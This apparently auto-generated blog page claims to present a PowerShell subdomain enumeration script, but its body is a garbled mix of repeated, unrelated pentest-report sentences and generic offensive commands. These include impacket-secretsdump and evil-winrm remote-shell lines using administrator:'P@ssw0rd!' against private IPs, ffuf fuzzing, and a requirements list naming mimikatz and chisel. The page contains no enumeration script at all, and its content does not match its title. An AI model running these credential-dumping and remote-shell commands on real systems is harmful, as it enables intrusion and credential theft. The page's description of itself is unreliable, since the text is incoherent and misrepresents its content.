---
TitleSEO: "Subdomain Enumeration Tool in PowerShell | ZureFX"
TitlePost: "Subdomain Enumeration Tool — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for subdomain enumeration tool. Built for security research and automation."
Keywords: "python, rust, bash, automation, fuzzer, powershell"
URL: "https://zurefx.github.io/scripting/script-subdomain-enumeration-tool-915.html"
URL_IMAGES: ""
Date: "2025-03-02"
Tags: "Python, Rust, Bash, Automation, Fuzzer, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-subdomain-enumeration-tool-915"
Permalink: "/scripting/script-subdomain-enumeration-tool-915.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `sqlmap`
- `chisel`
- `mimikatz`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```powershell
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.11.62
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.33.106.126 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.95.181.65/FUZZ
evil-winrm -i 10.122.17.241 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.234.69/FUZZ
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 3.26s
```
